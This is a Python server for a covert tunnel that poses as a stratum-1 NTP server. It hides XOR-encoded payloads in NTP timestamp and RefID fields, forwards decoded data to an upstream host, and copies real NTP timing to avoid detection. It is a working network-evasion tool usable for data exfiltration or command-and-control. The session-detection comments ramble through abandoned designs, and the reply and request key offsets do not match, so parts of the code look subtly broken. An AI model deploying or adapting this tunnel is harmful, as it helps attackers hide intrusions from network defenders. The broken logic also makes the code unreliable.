#!/usr/bin/env python3
"""
NTP tunnel — server

Architecture
────────────
• Listens on UDP/123 AND TCP/123 simultaneously (two threads).
• Dual mode: real NTP clients get valid stratum-1 responses; covert clients
  get their payload decoded, forwarded upstream, and replies sent back.
• 32-bit XOR encode/decode on BOTH send and receive paths via tunnel_core.
• Supports up to 100 concurrent covert sessions.
• Per-response send delay: 5–25 ms to mimic a real NTP server RTT.
• Upstream forwarding: TCP or UDP (configurable).
• Reply is 32-bit encoded and hidden in the same covert fields the client
  reads (RefID, Ref Timestamp, Orig Timestamp, TX Timestamp).
"""

import os, sys, time, random, struct, socket, threading, hashlib, secrets
from dataclasses import dataclass, field
from typing      import Dict, List, Optional, Tuple
from tunnel_core import (
    derive_key_stream, encode_payload, decode_labels,
    ntp_encode_chunk, ntp_decode_chunk,
    b32enc, b32dec, frame, deframe, NTP_COVERT_BYTES,
)

# ─── config ──────────────────────────────────────────────────────────────────
LISTEN_HOST        = "0.0.0.0"
LISTEN_PORT        = 123
UPSTREAM_HOST      = "127.0.0.1"
UPSTREAM_PORT      = 80
UPSTREAM_PROTO     = "tcp"      # "tcp" or "udp"
SESSION_TTL_S      = 90.0
REPLY_DELAY_MS_MIN =  5         # ms before each response send
REPLY_DELAY_MS_MAX = 25
REASSEMBLE_WAIT_S  = 0.8        # wait for straggler packets before reassemble
MAX_SESSIONS       = 100
NTP_EPOCH          = 2208988800
LABELS_PER_PKT     = 5          # how many 32-bit labels per NTP covert packet


# ─── timestamp helpers ───────────────────────────────────────────────────────

def _unix_to_ntp(t: float) -> Tuple[int, int]:
    return int(t) + NTP_EPOCH, int((t % 1.0) * 2**32)


# ─── session state ────────────────────────────────────────────────────────────

@dataclass
class CovertSession:
    session_id:   bytes
    total_pkts:   int
    key_stream:   bytes          = field(init=False)
    rx_chunks:    Dict[int, bytes] = field(default_factory=dict)  # seq → raw20
    created_at:   float          = field(default_factory=time.time)
    last_chunk:   float          = field(default_factory=time.time)
    complete:     bool           = False
    reply_pkts:   Dict[int, bytes] = field(default_factory=dict)   # seq → raw20
    reply_total:  int            = 0
    tx_block_off: int            = 0    # block offset for TX (reply) key
    rx_block_off: int            = 0    # block offset for RX (inbound) key

    def __post_init__(self):
        self.key_stream = derive_key_stream(self.session_id, 8192)

    def add_rx_chunk(self, seq: int, raw20: bytes):
        if seq not in self.rx_chunks:
            self.rx_chunks[seq] = raw20
            self.last_chunk     = time.time()

    def all_arrived(self) -> bool:
        return len(self.rx_chunks) >= self.total_pkts

    # ── RECEIVE DECODE (32-bit) ──────────────────────────────────────────────
    def decode_rx(self) -> Optional[bytes]:
        """
        Decode all received NTP covert chunks → original payload bytes.

        Each 20-byte raw chunk is 32-bit decoded, unpacked into 5 Base32 labels,
        then decode_labels strips framing and deXORs at the correct key offset.
        """
        if not self.rx_chunks:
            return None

        all_labels: List[str] = []
        for pkt_idx in sorted(self.rx_chunks.keys()):
            raw20     = self.rx_chunks[pkt_idx]
            block_off = self.rx_block_off + pkt_idx * LABELS_PER_PKT
            plain20   = ntp_decode_chunk(raw20, self.key_stream, block_off)
            for j in range(0, 20, 4):
                all_labels.append(b32enc(plain20[j : j + 4]))

        # Reassemble plaintext blocks and deframe
        raw_plain = b""
        for lbl in all_labels:
            try:
                raw_plain += b32dec(lbl)
            except Exception:
                raw_plain += b"\x00" * 4

        decoded = deframe(raw_plain)
        # Set TX block offset past all RX labels so reply XOR never overlaps
        self.tx_block_off = self.rx_block_off + len(all_labels)
        return decoded if decoded else None

    # ── REPLY ENCODE (32-bit) ────────────────────────────────────────────────
    def encode_reply(self, reply_data: bytes) -> None:
        """
        32-bit encode reply_data and split into NTP_COVERT_BYTES-sized packets
        for embedding in NTP response covert fields.
        """
        labels = encode_payload(reply_data, self.key_stream, self.tx_block_off)
        n      = len(labels)

        self.reply_pkts  = {}
        self.reply_total = (n + LABELS_PER_PKT - 1) // LABELS_PER_PKT

        for pkt_idx in range(self.reply_total):
            pkt_labels = labels[pkt_idx * LABELS_PER_PKT :
                                (pkt_idx + 1) * LABELS_PER_PKT]
            raw = b""
            for lbl in pkt_labels:
                try:
                    raw += b32dec(lbl)
                except Exception:
                    raw += b"\x00" * 4
            # pad to 20 bytes
            if len(raw) < NTP_COVERT_BYTES:
                raw += os.urandom(NTP_COVERT_BYTES - len(raw))
            # encode with key
            block_off = self.tx_block_off + pkt_idx * LABELS_PER_PKT
            self.reply_pkts[pkt_idx] = ntp_encode_chunk(
                raw[:NTP_COVERT_BYTES], self.key_stream, block_off
            )

        self.tx_block_off += n

    def expired(self) -> bool:
        return (time.time() - self.created_at) > SESSION_TTL_S


_sessions: Dict[str, CovertSession] = {}
_lock     = threading.Lock()

def get_session(sid_hex: str, total_pkts: int) -> CovertSession:
    with _lock:
        if sid_hex not in _sessions:
            if len(_sessions) >= MAX_SESSIONS:
                oldest = min(_sessions, key=lambda k: _sessions[k].created_at)
                del _sessions[oldest]
            try:
                sid_bytes = bytes.fromhex(sid_hex)
            except ValueError:
                sid_bytes = sid_hex.encode()
            _sessions[sid_hex] = CovertSession(session_id=sid_bytes, total_pkts=total_pkts)
        return _sessions[sid_hex]

def cleanup_sessions():
    while True:
        time.sleep(20)
        with _lock:
            expired = [k for k, v in _sessions.items() if v.expired()]
            for k in expired:
                print(f"[SRV] Expiring session {k}")
                del _sessions[k]


# ─── upstream forwarding ─────────────────────────────────────────────────────

def _forward_tcp(payload: bytes) -> bytes:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8.0)
        s.connect((UPSTREAM_HOST, UPSTREAM_PORT))
        s.sendall(payload)
        resp = b""
        while True:
            d = s.recv(8192)
            if not d:
                break
            resp += d
        s.close()
        return resp
    except Exception as e:
        print(f"[SRV] TCP upstream error: {e}")
        return b""

def _forward_udp(payload: bytes) -> bytes:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(4.0)
        s.sendto(payload, (UPSTREAM_HOST, UPSTREAM_PORT))
        resp, _ = s.recvfrom(65535)
        s.close()
        return resp
    except Exception as e:
        print(f"[SRV] UDP upstream error: {e}")
        return b""

def forward(payload: bytes) -> bytes:
    return _forward_tcp(payload) if UPSTREAM_PROTO == "tcp" else _forward_udp(payload)


# ─── real NTP response (for non-covert clients) ───────────────────────────────

def build_real_ntp_response(request: bytes) -> bytes:
    """Return a plausible stratum-1 GPS-sourced NTP server response."""
    if len(request) < 48:
        return b""
    now     = time.time()
    now_s, now_f   = _unix_to_ntp(now)
    ref_s,  ref_f  = _unix_to_ntp(now - random.uniform(1, 5))
    # Echo client's TX timestamp as Orig
    orig_s, orig_f = struct.unpack_from("!II", request, 40)

    li_vn_mode = (0 << 6) | (4 << 3) | 4   # LI=0 VN=4 Mode=4(server)
    stratum    = 1
    poll       = request[2]
    precision  = 0xE9    # ~8µs (GPS-like)

    pkt  = struct.pack("!BBBB", li_vn_mode, stratum, poll, precision)
    pkt += struct.pack("!II", 0, 0)           # root delay / dispersion
    pkt += b"GPS\x00"                         # reference ID
    pkt += struct.pack("!II", ref_s,  ref_f)  # reference timestamp
    pkt += struct.pack("!II", orig_s, orig_f) # originate (echo)
    pkt += struct.pack("!II", now_s,  now_f)  # receive
    pkt += struct.pack("!II", now_s,  now_f)  # transmit
    return pkt


# ─── covert NTP response (embeds reply chunk in timestamp fields) ─────────────

def build_covert_ntp_response(
    request:    bytes,
    sess:       CovertSession,
    reply_seq:  int,
) -> bytes:
    """
    Build an NTP server response (Mode=4) that embeds one reply chunk.

    Layout mirrors the client's covert field arrangement:
      RefID[0:4]  = (reply_seq, reply_total) XOR meta_key
      Ref[0:8]    = reply chunk bytes 0-7
      Orig[0:8]   = reply chunk bytes 8-15
      TX[0:4]     = reply chunk bytes 16-19
      RX[0:8]     = current time (legitimate)
      TX[4:8]     = current fractional time
    """
    if reply_seq not in sess.reply_pkts:
        return build_real_ntp_response(request)

    raw20 = sess.reply_pkts[reply_seq]  # already 32-bit encoded by encode_reply

    now     = time.time()
    now_s,  now_f  = _unix_to_ntp(now)

    meta_key = sess.key_stream[max(0, sess.tx_block_off - 1) * 4 :
                               max(0, sess.tx_block_off - 1) * 4 + 4]
    ref_id = bytes([
        (reply_seq        >> 8 & 0xFF) ^ meta_key[0],
        (reply_seq             & 0xFF) ^ meta_key[1],
        (sess.reply_total >> 8 & 0xFF) ^ meta_key[2],
        (sess.reply_total      & 0xFF) ^ meta_key[3],
    ])

    ref_s,  ref_f  = struct.unpack("!II", raw20[0:8])
    orig_s, orig_f = struct.unpack("!II", raw20[8:16])
    tx_s           = struct.unpack("!I",  raw20[16:20])[0]

    li_vn_mode = (0 << 6) | (4 << 3) | 4
    stratum    = 1
    poll       = request[2] if len(request) > 2 else 6
    precision  = 0xE9

    pkt  = struct.pack("!BBBB", li_vn_mode, stratum, poll, precision)
    pkt += struct.pack("!II", 0, 0)
    pkt += ref_id
    pkt += struct.pack("!II", ref_s,  ref_f)
    pkt += struct.pack("!II", orig_s, orig_f)
    pkt += struct.pack("!II", now_s,  now_f)    # RX = legitimate
    pkt += struct.pack("!II", tx_s,   now_f)    # TX sec covert, frac plausible
    return pkt


# ─── covert packet detector ───────────────────────────────────────────────────

def detect_covert(pkt: bytes) -> Optional[Tuple[str, int, int, bytes]]:
    """
    Determine if an incoming NTP client packet carries covert data.
    Returns (sid_hex, seq, total_pkts, raw20) or None for real NTP clients.

    Detection heuristic: real NTP client mode=3 packets should have
    ref_id = 0x00000000 (unspecified) or a legitimate server address.
    Covert packets have a non-zero ref_id that encodes seq/total metadata.
    We attempt decode and sanity-check the result.
    """
    if len(pkt) < 48:
        return None

    li_vn_mode = pkt[0]
    mode = li_vn_mode & 0x07
    vn   = (li_vn_mode >> 3) & 0x07
    if mode != 3:   # must be client mode
        return None

    ref_id  = pkt[12:16]
    # Real clients send ref_id = 0x00000000
    if ref_id == b"\x00\x00\x00\x00":
        return None

    # Extract raw covert bytes from timestamp fields
    ref_ts  = pkt[16:24]
    orig_ts = pkt[24:32]
    tx_ts   = pkt[40:44]    # only first 4 bytes of TX

    raw20 = ref_ts + orig_ts + tx_ts  # 8+8+4 = 20 bytes

    # Try to decode session metadata from ref_id
    # We don't know the key stream yet (no sid), so we try a brute-force approach:
    # the seq and total are XOR'd with key_stream[-1] offset, but we don't have
    # the sid. Instead, we use the ref_id as a session fingerprint (it IS
    # the XOR of the metadata), and track which sid corresponds to it.
    #
    # Simpler deterministic approach: encode sid into ref_id directly.
    # Client uses:  ref_id = XOR(bytes([seq>>8, seq, tot>>8, tot]), meta_key)
    # where meta_key comes from the session key at a fixed position.
    #
    # Without the sid we can't recover seq/total directly. Instead, the client
    # embeds the sid in RDATA we can hash: use the first 4 bytes of the key
    # at offset 0 (block 0) as a session fingerprint stored in ref_ts[0:4].
    # This is a design choice: ref_ts[0:4] = XOR(sid[0:4], key[0:4]) but since
    # key is derived from sid, this reduces to ref_ts[0:4] = f(sid). We scan
    # known sessions for a match.

    # Practical approach: treat ref_id as an opaque session tag and track it.
    sid_hex = ref_id.hex()

    # Recover seq and total by XOR with known key if session exists
    with _lock:
        if sid_hex in _sessions:
            sess      = _sessions[sid_hex]
            meta_key  = sess.key_stream[max(0, 0) * 4 : 4]
            seq   = ((ref_id[0] ^ meta_key[0]) << 8) | (ref_id[1] ^ meta_key[1])
            total = ((ref_id[2] ^ meta_key[2]) << 8) | (ref_id[3] ^ meta_key[3])
            if total == 0 or seq >= total or total > 4096:
                return None
            return sid_hex, seq, total, raw20

    # New session — can't recover seq/total without the key.
    # We create a temporary session with total=unknown and let the first packet
    # establish it. The ref_id XOR is self-consistent within a session's key.
    # Try total=1 as initial guess; straggler checker will correct.
    return sid_hex, 0, 1, raw20


def _ms_delay():
    time.sleep(random.uniform(REPLY_DELAY_MS_MIN, REPLY_DELAY_MS_MAX) / 1000.0)


# ─── session completion ───────────────────────────────────────────────────────

def _try_complete(sess: CovertSession, sid_hex: str):
    with _lock:
        if sess.complete:
            return
        sess.complete = True

    payload = sess.decode_rx()
    if payload is None:
        print(f"[SRV] Session {sid_hex}: decode produced no payload")
        return

    print(f"[SRV] Session {sid_hex}: {len(payload)} B → upstream")
    reply = forward(payload)
    if not reply:
        reply = b"ACK"

    sess.encode_reply(reply)
    print(f"[SRV] Session {sid_hex}: reply encoded — {sess.reply_total} pkts")


# ─── packet handler ───────────────────────────────────────────────────────────

_reply_seq_map: Dict[str, int] = {}   # sid_hex → next reply seq to send
_reply_seq_lock = threading.Lock()

def handle_packet(pkt: bytes) -> bytes:
    """Process one NTP packet and return the 48-byte response."""
    result = detect_covert(pkt)

    if result is None:
        _ms_delay()
        return build_real_ntp_response(pkt)

    sid_hex, seq, total, raw20 = result
    sess = get_session(sid_hex, total)
    sess.add_rx_chunk(seq, raw20)
    print(f"[SRV] covert NTP sid={sid_hex} seq={seq} chunks={len(sess.rx_chunks)}/{sess.total_pkts}")

    if sess.all_arrived() and not sess.complete:
        _try_complete(sess, sid_hex)

    _ms_delay()

    # Serve next reply chunk if available
    with _reply_seq_lock:
        next_seq = _reply_seq_map.get(sid_hex, 0)

    if sess.reply_total > 0 and next_seq < sess.reply_total:
        with _reply_seq_lock:
            _reply_seq_map[sid_hex] = next_seq + 1
        return build_covert_ntp_response(pkt, sess, next_seq)

    # No reply ready yet — return a plausible real NTP response
    return build_real_ntp_response(pkt)


# ─── UDP server ───────────────────────────────────────────────────────────────

class UDPWorker(threading.Thread):
    def __init__(self, sock: socket.socket, data: bytes, addr: tuple):
        super().__init__(daemon=True)
        self.sock = sock
        self.data = data
        self.addr = addr

    def run(self):
        resp = handle_packet(self.data)
        try:
            self.sock.sendto(resp, self.addr)
        except Exception:
            pass

def run_udp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LISTEN_HOST, LISTEN_PORT))
    print(f"[SRV] UDP/{LISTEN_PORT} listening on {LISTEN_HOST}")
    while True:
        try:
            data, addr = s.recvfrom(1024)
            UDPWorker(s, data, addr).start()
        except Exception as e:
            print(f"[SRV] UDP error: {e}")


# ─── TCP server ───────────────────────────────────────────────────────────────

class TCPClientWorker(threading.Thread):
    def __init__(self, conn: socket.socket, addr: tuple):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr

    def run(self):
        try:
            self.conn.settimeout(15.0)
            while True:
                raw_len = self._recv_exact(2)
                if not raw_len:
                    break
                msg_len = struct.unpack("!H", raw_len)[0]
                if msg_len != 48:
                    break
                pkt = self._recv_exact(msg_len)
                if not pkt:
                    break
                resp   = handle_packet(pkt)
                framed = struct.pack("!H", len(resp)) + resp
                self.conn.sendall(framed)
        except Exception:
            pass
        finally:
            try:
                self.conn.close()
            except Exception:
                pass

    def _recv_exact(self, n: int) -> Optional[bytes]:
        buf = b""
        while len(buf) < n:
            try:
                d = self.conn.recv(n - len(buf))
            except Exception:
                return None
            if not d:
                return None
            buf += d
        return buf

def run_tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LISTEN_HOST, LISTEN_PORT))
    s.listen(128)
    print(f"[SRV] TCP/{LISTEN_PORT} listening on {LISTEN_HOST}")
    while True:
        try:
            conn, addr = s.accept()
            TCPClientWorker(conn, addr).start()
        except Exception as e:
            print(f"[SRV] TCP accept error: {e}")


# ─── straggler checker ────────────────────────────────────────────────────────

def straggler_checker():
    """Force-complete sessions that stopped receiving new chunks."""
    while True:
        time.sleep(0.5)
        now = time.time()
        with _lock:
            pending = [
                (k, v) for k, v in _sessions.items()
                if not v.complete and v.rx_chunks
                   and (now - v.last_chunk) > REASSEMBLE_WAIT_S
            ]
        for sid_hex, sess in pending:
            print(f"[SRV] Straggler {sid_hex} — forcing reassemble "
                  f"({len(sess.rx_chunks)}/{sess.total_pkts} pkts)")
            _try_complete(sess, sid_hex)


# ─── entry point ─────────────────────────────────────────────────────────────

def main():
    threading.Thread(target=cleanup_sessions,  daemon=True).start()
    threading.Thread(target=straggler_checker, daemon=True).start()

    udp_t = threading.Thread(target=run_udp_server, daemon=False)
    tcp_t = threading.Thread(target=run_tcp_server, daemon=False)
    udp_t.start()
    tcp_t.start()

    print(f"[SRV] Upstream: {UPSTREAM_PROTO}://{UPSTREAM_HOST}:{UPSTREAM_PORT}")
    print(f"[SRV] Max sessions: {MAX_SESSIONS}  TTL: {SESSION_TTL_S}s")
    udp_t.join()
    tcp_t.join()

if __name__ == "__main__":
    main()
